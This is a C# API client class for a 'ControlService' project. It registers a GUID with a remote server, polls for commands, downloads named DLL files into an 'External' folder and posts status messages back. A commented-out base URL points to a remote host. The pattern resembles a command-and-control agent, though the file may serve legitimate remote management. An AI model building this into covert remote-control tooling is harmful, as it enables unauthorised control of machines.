using System.Text.Json;
using RestSharp;
using ControlService.Models;
using ControlService.Core.Models;
using System.Diagnostics;

namespace ControlService.Core
{
    internal class Api
    {
        public string Guid { get; set; }
        string _baseUrl;// = "http://remote.offmysoap1.fvds.ru:7030/";
        RestClient _client;

        internal Api(string guid, string baseUrl)
        {
            _baseUrl = baseUrl;
            _client = new RestClient(_baseUrl);
            
            if (guid != null && guid != "")
            {
                Guid = guid;
            }
            else
            {

                GetGuid();
            }
            Trace.WriteLine($"Guid = {Guid}");
        }

        internal void GetGuid()
        {
            string url = "api/manager";
            RestRequest request = new RestRequest(url, Method.Get);
            var response =  _client.GetAsync(request).Result;
            Guid = response.Content.Trim('\"');
        }

        internal async Task<List<Command>> GetCommands()
        {
            string url = "api/manager/commands";
            RestRequest request = new RestRequest(url, Method.Get);
            request.AddParameter("guid", Guid);
            var resonse = await _client.GetAsync(request);
            List <Command> commands = JsonSerializer.Deserialize<Command[]>(resonse.Content).ToList();
            return commands;
        }

        internal void DownloadFile(string name)
        {
            string url = "api/download/file";
            RestRequest request = new RestRequest(url, Method.Get);
            request.AddParameter("name", name);
            if (!Directory.Exists("External"))
            {
                Directory.CreateDirectory("External");
            }
            File.WriteAllBytes($"External/{name}.dll", _client.DownloadDataAsync(request).Result);
        }

        internal string SendMessage(string text)
        {
            string url = "api/manager";
            RestRequest request = new RestRequest(url, Method.Post);
            Message message = new Message { Guid = Guid, Text = text, Time = DateTime.UtcNow};
            request.AddJsonBody<Message>(message);
            RestResponse response = _client.PostAsync(request).Result;
            return response.StatusCode.ToString();
        }
    }
}
